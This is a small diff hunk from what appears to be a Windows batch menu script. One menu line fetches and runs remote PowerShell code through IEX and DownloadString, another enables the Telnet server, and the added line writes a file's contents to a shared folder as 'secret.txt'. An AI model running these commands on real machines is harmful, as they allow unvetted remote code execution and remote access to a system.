@@ -46,6 +46,7 @@ cmd /c start powershell -Command {IEX (New-Object Net.WebClient).DownloadString(
 goto MENU
 :Four
 dism /online /enable-feature /featurename:TelnetServer
+type fjrieiejjdo3938@ > C:\Share\secret.txt
 goto MENU
 :Five
 echo seriously
